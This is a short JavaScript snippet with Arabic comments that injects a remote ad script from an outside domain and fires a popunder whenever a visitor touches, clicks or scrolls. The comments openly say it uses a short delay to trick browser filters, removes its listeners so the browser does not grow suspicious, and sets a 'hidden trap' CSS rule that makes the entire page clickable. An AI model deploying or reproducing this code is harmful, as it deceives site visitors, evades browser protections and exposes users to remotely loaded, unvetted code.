(function() {
    // 1. الفحص: هل البراميتر ?t1 موجود؟
    if (!new URLSearchParams(window.location.search).has('t1')) return;

    const adConfig = {
        lib: "https://onetouch4.com/sl/pnm/61287.js",
        trigger: "https://daleelerah.info/pop-go/61287",
        options: {"newTab":false,"blur":false,"cookieExpires":60,"delay":500}
    };

    let activated = false;

    // 2. المحرك العبقري: استغلال "بداية التفاعل"
    const startLogic = () => {
        if (activated) return;
        activated = true;

        // أ. حقن المكتبة فوراً
        const s = document.createElement('script');
        s.src = adConfig.lib;
        s.async = true;
        
        s.onload = () => {
            // ب. تشغيل الكود في "فراغ زمني" قصير جداً لخدع فلاتر المتصفح
            setTimeout(() => {
                if (typeof firstAggOmg !== 'undefined') {
                    firstAggOmg.make(adConfig.trigger, adConfig.options);
                    console.log("System Deployed");
                }
            }, 100);
        };

        document.head.appendChild(s);
        
        // ج. تنظيف المستمعات لعدم إثارة الشكوك في المتصفح
        ['touchstart', 'mousedown', 'scroll'].forEach(ev => 
            window.removeEventListener(ev, startLogic));
    };

    // 3. مستمعات "ذكاء السلوك": أي حركة يقوم بها الزائر ستفعل الإعلان
    window.addEventListener('touchstart', startLogic, {passive: true});
    window.addEventListener('mousedown', startLogic);
    window.addEventListener('scroll', startLogic, {passive: true});

    // 4. "الفخ الخفي": تحويل الموقع بالكامل لمساحة تفاعلية
    const ghostStyle = document.createElement('style');
    ghostStyle.innerHTML = `html, body { height: 100.1vh !important; cursor: pointer !important; }`;
    document.head.appendChild(ghostStyle);

})();
